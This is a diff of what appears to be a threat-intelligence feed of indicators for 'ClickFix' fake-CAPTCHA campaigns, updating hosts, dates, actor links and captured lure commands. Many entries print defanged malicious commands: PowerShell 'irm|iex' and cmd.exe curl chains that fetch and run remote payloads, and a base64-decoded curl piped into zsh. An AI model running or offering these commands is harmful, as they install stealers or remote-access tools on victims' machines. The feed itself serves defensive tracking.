@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 3983,
+ "count": 3982,
  "indicators": [
   {
    "indicator": "100porcentopiaui.com.br",
@@ -854,7 +854,7 @@
    "role": "Operator infrastructure",
    "status": "offline",
    "first_seen": "2026-10-18",
-   "last_seen": "2026-10-30",
+   "last_seen": "2026-10-31",
    "last_online": "2026-10-25",
    "offline_since": "2026-10-27",
    "url": "http://144.172.85.251:9999/glc",
@@ -872,7 +872,7 @@
      "host": "144.172.85.251",
      "status": "offline",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-10-30"
+     "last_seen": "2026-10-31"
     }
    ],
    "actor": null,
@@ -1002,7 +1002,7 @@
      "host": "157.205.12.11",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -1164,6 +1164,48 @@
    "lure_from": []
   },
   {
+   "indicator": "168.119.240.217",
+   "type": "ip",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-01",
+   "last_online": "2026-11-01",
+   "offline_since": null,
+   "url": "https://168.119.240.217/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hetzner",
+   "dns": null,
+   "ip": null,
+   "asn": "AS24940",
+   "org": "Hetzner Online GmbH",
+   "country": "DE",
+   "ips": [],
+   "hosts": [
+    {
+     "host": "168.119.240.217",
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=1188ff33-7c9b-40de-95d9-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.a-stergiou.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T00%3A06%3A17.586Z\"\" -d \"\"lastShellAt=2026-11-01T00%3A06%3A17.586Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+   ],
+   "connects_to": [
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "ncheck-brows.beer"
+   ]
+  },
+  {
    "indicator": "169.239.133.141",
    "type": "ip",
    "category": "clickfix",
@@ -1253,12 +1295,12 @@
    "type": "ip",
    "category": "clickfix",
    "campaign": null,
-   "role": "Redirector",
-   "status": "offline",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-10-24",
-   "last_online": "2026-10-31",
-   "offline_since": "2026-10-31",
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-01",
+   "last_online": "2026-11-01",
+   "offline_since": null,
    "url": "https://172.104.186.13/",
    "brand": null,
    "product": null,
@@ -1272,17 +1314,17 @@
    "hosts": [
     {
      "host": "172.104.186.13",
-     "status": "offline",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-24"
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=8fdd1764-c723-4b87-9bd4-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.furnituresrilanka.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T22%3A10%3A36.031Z\"\" -d \"\"lastShellAt=2026-10-29T22%3A10%3A36.031Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=fc36b232-e9fd-4836-9af5-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.furnituresrilanka.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T00%3A06%3A26.284Z\"\" -d \"\"lastShellAt=2026-11-01T00%3A06%3A26.284Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=ab64235b-dfbc-470d-89cf-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2F[ip]%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-28T14%3A04%3A27.359Z\"\" -d \"\"lastShellAt=2026-10-28T14%3A04%3A27.359Z\"\" \"\"hxxps[:]//script[.]google[.][encoded]\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]space/w/8ecec3ba\"\" | powershell\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=8fdd1764-c723-4b87-9bd4-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.furnituresrilanka.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T22%3A10%3A36.031Z\"\" -d \"\"lastShellAt=2026-10-29T22%3A10%3A36.031Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -1298,6 +1340,7 @@
    "lure_from": [
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc",
+    "ncheck-brows.beer",
     "interseq.at",
     "btorsercoyt31.cc",
     "id-verfied.boats",
@@ -1365,7 +1408,7 @@
      "host": "178.128.209.102",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -1404,7 +1447,7 @@
      "host": "185.187.169.164",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -2484,7 +2527,7 @@
      "host": "38.54.14.242",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-26"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -2565,7 +2608,7 @@
      "host": "38.60.233.200",
      "status": "online",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-26"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -2765,8 +2808,8 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/b77d-[id] | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/renf4y77/4e56-a2a2-[id]/FC-E2-1E-8C-32-20 | IEX"
+    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
+    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [],
    "lure_from": []
@@ -3416,7 +3459,7 @@
      "host": "51.79.62.40",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -8111,7 +8154,7 @@
      "asn": "AS13335",
      "org": "Cloudflare, Inc.",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -8119,7 +8162,7 @@
      "host": "afrobloggers.org",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -8605,58 +8648,6 @@
    ],
    "lure_from": [
     "ncheck-brows.beer"
-   ]
-  },
-  {
-   "indicator": "airclimate-group.nl",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-22",
-   "last_seen": "2026-10-22",
-   "last_online": "2026-10-31",
-   "offline_since": null,
-   "url": "https://airclimate-group.nl/",
-   "brand": null,
-   "product": null,
-   "hosting": "ONECOM One.com A/S",
-   "dns": "hostnet.nl",
-   "ip": "91.184.31.14",
-   "asn": "AS51468",
-   "org": "ONECOM One.com A/S, DK",
-   "country": "DK",
-   "ips": [
-    {
-     "ip": "91.184.31.14",
-     "asn": "AS51468",
-     "org": "ONECOM One.com A/S, DK",
-     "first_seen": "2026-10-22",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "airclimate-group.nl",
-     "status": "online",
-     "first_seen": "2026-10-22",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
-   ],
-   "connects_to": [
-    "t-trustrest.com",
-    "xorados.com",
-    "trek-72.com"
-   ],
-   "lure_from": [
-    "interseq.at"
    ]
   },
   {
@@ -12058,7 +12049,7 @@
      "asn": "AS22612",
      "org": "Namecheap, Inc.",
      "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -12066,7 +12057,7 @@
      "host": "amcoskillbd.com",
      "status": "online",
      "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -19989,7 +19980,7 @@
      "asn": "AS17514",
      "org": "Otsuka Corp.",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -19997,7 +19988,7 @@
      "host": "b-t-s.jp",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -47233,7 +47224,7 @@
      "asn": "AS26347",
      "org": "New Dream Network, LLC",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -47241,7 +47232,7 @@
      "host": "www.csspuertorico.com",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -53624,7 +53615,7 @@
      "asn": "AS13335",
      "org": "Cloudflare, Inc.",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -53632,7 +53623,7 @@
      "host": "divinecollectionbreastforms.com",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -57738,19 +57729,19 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=39f1|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=39f1|iex</span>",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1cd5|iex"
    ],
    "connects_to": [
-    "verifyidentrob01.cc",
+    "ubbrobccheck20.cc",
     "t-trustrest.com",
     "xorados.com",
-    "groverudder12.com"
+    "groverudder12.com",
+    "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "interseq.at",
-    "ubbrobccheck20.cc"
+    "interseq.at"
    ]
   },
   {
@@ -62982,15 +62973,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=d08653a6-072d-44b3-afa3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ercanmakinabursa.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A42.981Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A42.981Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=1daea4af-966d-4037-ba0f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ercanmakinabursa.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A32%3A40.988Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A32%3A40.988Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5ca59fe6-be36-4db9-94f0-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ercanmakinabursa.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A15%3A08.759Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A15%3A08.759Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=d08653a6-072d-44b3-afa3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ercanmakinabursa.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A42.981Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A42.981Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -64021,9 +64012,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=99a20856-0884-4dc0-a831-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.evlilikteklifi.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T20%3A10%3A00.414Z\"\" -d \"\"lastShellAt=2026-10-30T20%3A10%3A00.414Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=2394d787-007a-4985-9ed2-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.evlilikteklifi.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T19%3A52%3A13.649Z\"\" -d \"\"lastShellAt=2026-10-29T19%3A52%3A13.649Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=8e72e4d6-2a12-436b-853d-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.evlilikteklifi.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A53%3A11.976Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A53%3A11.976Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=99a20856-0884-4dc0-a831-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.evlilikteklifi.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T20%3A10%3A00.414Z\"\" -d \"\"lastShellAt=2026-10-30T20%3A10%3A00.414Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -65777,53 +65768,6 @@
    "lure_from": [
     "interseq.at"
    ]
-  },
-  {
-   "indicator": "fboudin.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-29",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-10-31",
-   "offline_since": null,
-   "url": "https://fboudin.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "OVHcloud",
-   "dns": "OVH",
-   "ip": "2001:41d0:301::26",
-   "asn": "AS16276",
-   "org": "OVH OVH SAS, FR",
-   "country": "FR",
-   "ips": [
-    {
-     "ip": "2001:41d0:301::26",
-     "asn": "AS16276",
-     "org": "OVH OVH SAS, FR",
-     "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "fboudin.com",
-     "status": "online",
-     "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex;"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer"
-   ],
-   "lure_from": []
   },
   {
    "indicator": "fc-wernberg.de",
@@ -71782,15 +71726,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=c365e1a3-d062-44e1-b986-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffuller-eg.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A04%3A38.902Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A04%3A38.902Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=951bf03b-878f-419b-8417-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffuller-eg.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T17%3A50%3A15.037Z\"\" -d \"\"lastShellAt=2026-10-29T17%3A50%3A15.037Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=11a8db72-2aa7-4632-8d9f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffuller-eg.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A14%3A52.638Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A14%3A52.638Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=c365e1a3-d062-44e1-b986-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffuller-eg.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A04%3A38.902Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A04%3A38.902Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -78535,7 +78479,7 @@
    "last_seen": "2026-10-31",
    "last_online": "2026-10-31",
    "offline_since": null,
-   "url": "https://c23c1b-fa77-48e0-8272-692b579a574c.gorsefield.cc/cinstall.ps1",
+   "url": "https://gorsefield.cc/updates.ps1",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -78630,7 +78574,7 @@
      "host": "gorsefield.cc",
      "status": "online",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-10-30"
+     "last_seen": "2026-10-31"
     }
    ],
    "actor": null,
@@ -81694,7 +81638,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-28",
-   "last_seen": "2026-10-31",
+   "last_seen": "2026-11-01",
    "last_online": "2026-10-31",
    "offline_since": null,
    "url": "https://guvenfilm.com/",
@@ -81712,7 +81656,7 @@
      "asn": "AS47583",
      "org": "Hostinger International Limited",
      "first_seen": "2026-10-28",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     },
     {
      "ip": "91.108.100.111",
@@ -81727,7 +81671,7 @@
      "host": "guvenfilm.com",
      "status": "online",
      "first_seen": "2026-10-28",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": "dprk",
@@ -84500,7 +84444,7 @@
      "asn": "AS42831",
      "org": "UK Dedicated Servers Limited",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -84508,7 +84452,7 @@
      "host": "heritageandflair.com",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -89237,15 +89181,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=3eb8ca81-10cd-4815-8c3f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fidealinvestimmobilier.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A42.231Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A42.231Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=4232d91f-10fe-46ff-be62-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fidealinvestimmobilier.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A32%3A45.624Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A32%3A45.624Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=a7768e81-c142-4c1f-aecd-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fidealinvestimmobilier.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A22%3A20.323Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A22%3A20.323Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=3eb8ca81-10cd-4815-8c3f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fidealinvestimmobilier.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A42.231Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A42.231Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -92793,15 +92737,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=fefabc6d-5472-4e7e-9ce3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ingecolsan.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A34%3A21.908Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A34%3A21.908Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=e19d4b69-bcdf-45f5-bd23-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ingecolsan.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T17%3A50%3A19.387Z\"\" -d \"\"lastShellAt=2026-10-29T17%3A50%3A19.387Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=95160183-d9ca-41f3-b1c1-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ingecolsan.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A14%3A54.430Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A14%3A54.430Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
